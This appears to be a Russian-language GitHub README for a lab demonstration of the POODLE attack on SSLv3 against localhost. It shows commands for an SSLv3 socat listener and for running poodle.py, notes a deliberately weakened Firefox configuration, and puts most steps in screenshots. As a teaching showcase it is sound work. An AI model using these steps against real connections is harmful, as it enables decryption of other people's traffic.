# showcase-of-ssl
# установка ssl
apt-get install openssl
# генерируем ключ 
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/07e50593-2449-4b7d-9237-05ad54894b53)

# создаем свой мини сайт
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/21f58e24-5dc3-44ae-8923-34bbf951e4b6)


# устанавливаю уязвимость в конфиге браузера firefox
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/64956cb1-ffe1-43bc-a49d-1dd40c78476d)

# создание связи между сервером и ssl listener
socat -v -x OPENSSL-LISTEN:4433,verify=0,method=SSLv3,cert=cert-poodle.pem,key=key-poodle.pem,reuseaddr,fork TCP:localhost:4080

# для использования стандартных правил iptables
./poodle.py --target-port 4433 --start-offset 384 https://localhost:8443

# создание 3х терминалов 
./poodle-dev.sh httpserver
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/777ff6b4-5a38-4dde-9d78-234df41026e7)

./poodle-dev.sh sslserver
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/94165ddd-0219-4f11-b9ae-ffca19f57822)

./poodle-dev.sh attacker-nodebug

# подтверждаем самостоятельно сделанные сертификаты 
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/383beaf5-7389-4eae-b2e0-b14a51d37307)
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/a541d75e-43cf-4971-b907-c84e7c5408f0)


# проводим свою атаку
$ ./poodle.py --target-port 4433 --start-offset 384 https://localhost:8443
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/9f7c682c-653d-448f-a1cf-90ed5fa0de34)

